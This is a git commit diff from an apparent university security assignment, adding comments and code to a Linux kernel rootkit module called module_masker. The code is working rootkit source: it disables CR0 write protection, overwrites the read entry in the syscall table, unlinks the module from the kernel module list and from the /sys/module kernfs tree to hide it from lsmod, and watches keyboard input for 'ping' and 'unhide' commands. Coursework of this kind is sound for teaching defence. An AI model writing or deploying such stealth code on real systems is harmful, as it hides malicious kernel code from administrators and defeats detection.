4e3cb464bd1b25f9aa8be1dbfc8f54dc7c05563f
Nedko Stefanov Nedkov <nedko.stefanov.nedkov@gmail.com>
2015-11-17 12:41:33 +0100

    Hiding module successfully

--- Assignment_5/module_masker.c
+++ Assignment_5/module_masker.c
@@ -17,35 +17,23 @@
 /*                                                                             */
 /*   Date: November 2015                                                       */
 /*                                                                             */
-/*   Usage:                                                                    */
+/*   Usage: This module is hiding itself in the kernel context. Specifically,  */
+/*          it does not show up in /sys/module or in the output of lsmod.      */
+/*          Additionaly, it hooks the read system call and if the user types   */
+/*          `ping` the rootkit responds with `pong` in the kernel log. This    */
+/*          mecahnism is used to check if the rootkit is running. In order to  */
+/*          unload the module, the module needs to become visible again.       */
+/*          Therefore, the read system call is hooked to look for yet another  */
+/*          command, called `unhide`, which makes the module visible.          */
 /*                                                                             */
 /*******************************************************************************/
 
 #include <linux/module.h>		/* Needed by all kernel modules */
 #include <linux/syscalls.h>		/* Needed for __NR_read */
-
-#include <linux/init.h>
-#include <linux/kernel.h>
-#include <linux/errno.h>	// error numbers
-#include <linux/types.h>
-#include <linux/unistd.h>	// all system call numbers
-#include <linux/cred.h>		// struct cred
-#include <linux/sched.h>	// struct task_struct
-#include <linux/slab.h>
-#include <linux/fs.h>		// virtual file system
-#include <linux/uaccess.h>
-#include <linux/ioctl.h>
-#include <linux/miscdevice.h>
-#include <linux/string.h>	// String manipulation
-#include <linux/kobject.h>	// Define kobjects, stuructures, and functions
-#include <linux/namei.h>	// file lookup
-#include <linux/path.h>		// struct path, path_equal()
-#include <linux/file.h>		// struct file *fget(unsigned int fd);
-#include <linux/proc_fs.h>      // struct proc_dir_entry;
+#include <linux/list.h>			/* Needed for linked list interface */
 
 #include "module_masker.h"
 #include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */
-#include "kernfs.h"				/* Needed for remove_kernfs_node, insert_kernfs_node */
 
 
 MODULE_LICENSE("GPL");
@@ -66,9 +54,9 @@ static int __init module_masker_start(void)
 	/* Overwrite manipulated read syscall */
 	syscall_table[__NR_read] = (unsigned long *) my_read_syscall;
 
-	/* Enable `write-protect` mode */
 	enable_write_protect_mode();
 
+	/* Hide module from /sys/module and lsmod */
 	hide_module();
 
 	printk(KERN_INFO "module_masker rootkit: %s\n", "successfully inserted");
@@ -79,7 +67,7 @@ static int __init module_masker_start(void)
 
 
 /* Cleanup function which is called just before module
-   is rmmoded. It restores the original getdents() syscall. */
+   is rmmoded. It restores the original read() syscall. */
 static void __exit module_masker_end(void)
 {
 	disable_write_protect_mode();
@@ -120,7 +108,9 @@ void enable_write_protect_mode(void)
 
 
 /* Function that replaces the original read syscall. In addition to what
-   read syscall does, it also ... */
+   read syscall does, it also looks for two commands (`ping` and `unhide`).
+   When `ping` is typed, it responds with `pong` in the kernel log. When
+   `unhide` is typed, it makes the module visible again */
 asmlinkage long my_read_syscall(unsigned int fd, char __user *buf, size_t count)
 {
 	long ret;
@@ -134,12 +124,16 @@ asmlinkage long my_read_syscall(unsigned int fd, char __user *buf, size_t count)
 	if (fd != 0)
 		return ret;
 
+	/* Check if `ping` was typed */
 	if ((matches_count = count_matches(buf, HEARTBEAT, &heartbeat_matched_so_far)) > 0)
 		for (i=0 ; i<matches_count ; i++)
+			/* Respond with `pong` in the kernel log */
 			printk(KERN_INFO "module_masker rootkit: %s\n", HEARTBEAT_RESPONSE);
 
+	/* Check if `unhide` was typed */
 	if ((matches_count = count_matches(buf, VOILA, &voila_matched_so_far)) > 0) {
 		printk(KERN_INFO "module_masker rootkit: visible mode on\n");
+		/* Make the module visible again */
 		unhide_module();
 	}
 
@@ -147,6 +141,7 @@ asmlinkage long my_read_syscall(unsigned int fd, char __user *buf, size_t count)
 }
 
 
+/* Count matches of specified command in the user input */
 int count_matches(char *buf, char *command, int *chars_matched_so_far)
 {
 	int matches;
@@ -168,24 +163,40 @@ int count_matches(char *buf, char *command, int *chars_matched_so_far)
 }
 
 
+/* Hide module from /sys/module and from the output of lsmod. Do so by
+   removing entries of our module from kernel data structures */
 void hide_module(void)
 {
 	struct kernfs_node *kernfs_node_ptr;
 
 	module_is_hidden = 1;
 
-	/* Remove module structure from list with kernel modules, so it does
-       not appear in /proc/modules and lsmod. Keep in mind that when the
-       module is absent form the list, it cannot be uninstalled. */
+	/* All kernel modules are associated with a unique struct module structure. These
+       structures are maintained in a global list (specifically a doubly linked list).
+       Any newly created module will be added to the head of the list. The struct module
+       structure of our module is found under the macro THIS_MODULE. We remove our module
+       structure from the list, so it does not appear in /proc/modules and lsmod. We store
+       a reference of the previous node in the list, so we can add in its correct position
+       in the list when we need to make the module visible again. Keep in mind that when
+       the module is absent form the list, it cannot be uninstalled. */
 	module_prev = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
 
-	/* Hide module from /sys/module */
+	/* sysfs is a virtual file system provided by the Linux kernel. Every kernel module is
+       associated with a struct kobject which represents a kernel object and shows up as
+       directory in the sysfs filesystem (found under /sys/module). Kernel objects are kept
+       in a memory resident data structure (specifically a red-black tree). We remove the
+       kernel object associated with our module from that data structure, so it does not
+       appear in /sys/module. */
 	kernfs_node_ptr = THIS_MODULE->mkobj.kobj.sd;
-	remove_kernfs_node(kernfs_node_ptr);
+	/* THIS_MODULE is of type: struct module - mkobj is of type: struct module_kobject -
+       kobj is of type: struct kobject - sd is of type: struct kernfs_node*/
+	kernfs_unlink_sibling(kernfs_node_ptr);
 }
 
 
+/* Unhide module from /sys/module and from the output of lsmod, so it becomes
+   unloadable. Do so by re-adding entries of our module to kernel data structures */
 void unhide_module(void)
 {
 	struct kernfs_node *kernfs_node_ptr;
@@ -195,68 +206,116 @@ void unhide_module(void)
 
 	module_is_hidden = 0;
 
+	/* We add our module structure to the global list of loaded kernel modules, so it
+       does appear in /proc/modules and lsmod. We add it to its initial position in
+       the list (right after its previous node) */
 	list_add(&THIS_MODULE->list, module_prev);
 
-	//err = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, THIS_MODULE->name);
+	/* We add the kernel object associated with our kernel module to the memory resident
+       data structure of kernel objects. It will now appear in /sys/module. */
 	kernfs_node_ptr = THIS_MODULE->mkobj.kobj.sd;
-	insert_kernfs_node(kernfs_node_ptr);
+	kernfs_link_sibling(kernfs_node_ptr);
+
+	/* The module is now visible in /sys/module and lsmod and can now be removed */
 }
 
 
-void remove_kernfs_node(struct kernfs_node *kernfs_node_ptr)
+/*****************************************************************************/
+/*                                                                           */
+/*          CODE BELOW IS TAKEN FROM fs/kernfs/dir.c, lines 224-321          */
+/*                                                                           */
+/*****************************************************************************/
+
+static int kernfs_name_compare(unsigned int hash, const char *name,
+                               const void *ns, const struct kernfs_node *kn)
 {
-	/* rb_erase: Function defined in <rbtree.h>, Unlinks kernfs_node from sibling tree
-	 * Line 272@Linux/fs/kernfs/dir.c
-	 */
-	rb_erase(&kernfs_node_ptr->rb, &kernfs_node_ptr->parent->dir.children);
-	RB_CLEAR_NODE(&kernfs_node_ptr->rb);
+	if (hash < kn->hash)
+		return -1;
+	if (hash > kn->hash)
+		return 1;
+	if (ns < kn->ns)
+		return -1;
+	if (ns > kn->ns)
+		return 1;
+	return strcmp(name, kn->name);
 }
 
-
-int insert_kernfs_node(struct kernfs_node *kernfs_node_ptr)
+static int kernfs_sd_compare(const struct kernfs_node *left,
+                             const struct kernfs_node *right)
 {
-	struct rb_node **node = &kernfs_node_ptr->parent->dir.children.rb_node;
+	return kernfs_name_compare(left->hash, left->name, left->ns, right);
+}
+
+/**
+ *      kernfs_link_sibling - link kernfs_node into sibling rbtree
+ *      @kn: kernfs_node of interest
+ *
+ *      Link @kn into its sibling rbtree which starts from
+ *      @kn->parent->dir.children.
+ *
+ *      Locking:
+ *      mutex_lock(kernfs_mutex)
+ *
+ *      RETURNS:
+ *      0 on susccess -EEXIST on failure.
+ */
+static int kernfs_link_sibling(struct kernfs_node *kn)
+{
+	struct rb_node **node = &kn->parent->dir.children.rb_node;
 	struct rb_node *parent = NULL;
-	struct kernfs_node *pos;
-	int cmp_res;
 
 	while (*node) {
-		/* Get the kernfs_node from rb, rb_to_kernfs_node_ptr() */
+		struct kernfs_node *pos;
+		int result;
+
+		//pos = rb_to_kn(*node);
 		pos = rb_entry(*node, struct kernfs_node, rb);
 		parent = *node;
-		/* Compare the names to get the position to insert in rb tree */
-		cmp_res = name_compare(kernfs_node_ptr->hash, kernfs_node_ptr->name, kernfs_node_ptr->ns, pos);
-		//cmp_res = kernfs_sd_comapre(kernfs_node_ptr,pos);
-
-		if (cmp_res == 0)
+		result = kernfs_sd_compare(kn, pos);
+		if (result < 0)
+			node = &pos->rb.rb_left;
+		else if (result > 0)
+			node = &pos->rb.rb_right;
+		else
 			return -EEXIST;
-
-		node = (cmp_res < 0) ? &pos->rb.rb_left : &pos->rb.rb_right;
 	}
 
-	/* Add new node and reblance the tree */
-	rb_link_node(&kernfs_node_ptr->rb, parent,node);
-	rb_insert_color(&kernfs_node_ptr->rb, &kernfs_node_ptr->parent->dir.children);
+	/* add new node and rebalance the tree */
+	rb_link_node(&kn->rb, parent, node);
+	rb_insert_color(&kn->rb, &kn->parent->dir.children);
 
-	/* Successfully added, account subdir number */
-	if (kernfs_type(kernfs_node_ptr) == KERNFS_DIR)
-		kernfs_node_ptr->parent->dir.subdirs++;
+	/* successfully added, account subdir number */
+	if (kernfs_type(kn) == KERNFS_DIR)
+		kn->parent->dir.subdirs++;
 
 	return 0;
 }
 
-
-int name_compare(unsigned int hash, const char *name, const void *ns, const struct kernfs_node *kernfs_node_ptr)
+/**
+ *      kernfs_unlink_sibling - unlink kernfs_node from sibling rbtree
+ *      @kn: kernfs_node of interest
+ *
+ *      Try to unlink @kn from its sibling rbtree which starts from
+ *      kn->parent->dir.children.  Returns %true if @kn was actually
+ *      removed, %false if @kn wasn't on the rbtree.
+ *
+ *      Locking:
+ *      mutex_lock(kernfs_mutex)
+ */
+static bool kernfs_unlink_sibling(struct kernfs_node *kn)
 {
-	if (hash != kernfs_node_ptr->hash)
-		return hash - kernfs_node_ptr->hash;
+	if (RB_EMPTY_NODE(&kn->rb))
+		return false;
 
-	if (ns != kernfs_node_ptr->ns)
-		return ns - kernfs_node_ptr->ns;
+	if (kernfs_type(kn) == KERNFS_DIR)
+		kn->parent->dir.subdirs--;
 
-	return strcmp(name, kernfs_node_ptr->name);
+	rb_erase(&kn->rb, &kn->parent->dir.children);
+	RB_CLEAR_NODE(&kn->rb);
+	return true;
 }
 
+/*****************************************************************************/
 
 module_init(module_masker_start);
 module_exit(module_masker_end);
--- Assignment_5/module_masker.h
+++ Assignment_5/module_masker.h
@@ -17,39 +17,41 @@
 /*                                                                             */
 /*   Date: November 2015                                                       */
 /*                                                                             */
-/*   Usage:                                                                    */
+/*   Usage: Header file for kernel module `module_masker.c`.                   */
 /*                                                                             */
 /*******************************************************************************/
 
 #ifndef __MODULE_MASKER__
 #define __MODULE_MASKER__
 
-
+/* Definition of macros */
 #define CR0_WRITE_PROTECT_MASK (1 << 16)
 #define HEARTBEAT "ping"
 #define HEARTBEAT_RESPONSE "pong"
 #define VOILA "unhide"
 
 
-static int module_is_hidden;
-static struct list_head *module_prev;
+/* Definition of global variables */
+static int module_is_hidden;	/* Current state of module (1 ~> hidden) */
+int heartbeat_matched_so_far;	/* Characters of HEARTBEAT matched so far */
+int voila_matched_so_far;		/* Characters of VOILA matched so far */
 void **syscall_table;
 asmlinkage long (*original_read_syscall)(unsigned int, char __user *, size_t);
-int heartbeat_matched_so_far;   /* Characters of HEARTBEAT matched so far */
-int voila_matched_so_far;   /* Characters of VOILA matched so far */
+static struct list_head *module_prev;
 
 
+/* Declaration of functions */
 void disable_write_protect_mode(void);
 void enable_write_protect_mode(void);
 
-asmlinkage long my_read_syscall(unsigned int fd, char __user *buf, size_t count);
+asmlinkage long my_read_syscall(unsigned int, char __user *, size_t);
 int count_matches(char *, char *, int *);
 
 void hide_module(void);
 void unhide_module(void);
 
-void remove_kernfs_node(struct kernfs_node *);
-int insert_kernfs_node(struct kernfs_node *);
-int name_compare(unsigned int hash, const char *, const void *, const struct kernfs_node *);
+/* Implementation of functions below is taken from fs/kernfs/dir.c, lines 224-321 */
+static bool kernfs_unlink_sibling(struct kernfs_node *kn);
+static int kernfs_link_sibling(struct kernfs_node *kn);
 
 #endif
